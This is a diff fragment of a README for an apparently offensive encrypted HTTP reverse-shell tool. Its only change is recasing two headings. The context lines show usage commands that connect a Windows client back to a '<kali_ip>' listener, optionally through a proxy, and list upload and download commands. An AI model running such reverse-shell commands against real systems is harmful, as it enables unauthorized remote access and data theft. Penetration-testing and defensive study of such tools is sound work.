@@ -30,7 +30,7 @@ C:\client_shell_http.exe <kali_ip> 80
 C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 ```
 
-## EXTRAS:
+## Extras:
 ```client_shell_http.py``` - If you want to create your own executable or run directly from python,  code is available.
 
 ```TCP_proxy_online.py``` - TCP proxy from https://stackoverflow.com/questions/32468270/tcp-proxy-using-python Purely the work of voorloop. You might need to modfy lines 16 and 94 to modify the forwarded reverseshell/port and the proxy port, respectively.
@@ -39,7 +39,7 @@ C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 
 NB: If changing the ```secret``` AES encryption key, ensure you change both the client and server scripts to match.
 
-## COMMANDS:
+## Commands:
 ```upload [filename]```
 
 ```download [filename]```     => Need to rename file after download.
